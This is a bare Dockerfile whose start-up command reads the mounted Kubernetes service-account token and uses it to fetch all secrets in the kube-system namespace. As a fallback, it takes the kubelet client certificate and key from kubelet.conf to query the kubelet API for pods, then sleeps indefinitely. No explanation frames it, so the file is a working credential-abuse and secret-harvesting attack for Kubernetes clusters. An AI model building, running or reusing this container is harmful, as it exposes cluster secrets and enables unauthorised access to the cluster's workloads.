FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl
CMD ["/bin/bash", "-c", "if [[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]]; then KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -sSk -H \"Authorization: Bearer $KUBE_TOKEN\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/kube-system/secrets; else NODE_ROOT=/host-node; if [[ -f \"/etc/kubernetes/kubelet.conf\" ]]; then echo \"kubelet.conf found.\"; CERT_PATH=$(grep client-certificate \"/etc/kubernetes/kubelet.conf\" | awk -F ': ' '{print $2}' | tr -d '\"'); KEY_PATH=$(grep client-key \"/etc/kubernetes/kubelet.conf\" | awk -F ': ' '{print $2}' | tr -d '\"'); curl -k --cacert \"/etc/kubernetes/pki/ca.crt\" --key \"$KEY_PATH\" --cert \"$CERT_PATH\" https://${NODE_IP}:10250/pods/; fi; fi; sleep infinity"]
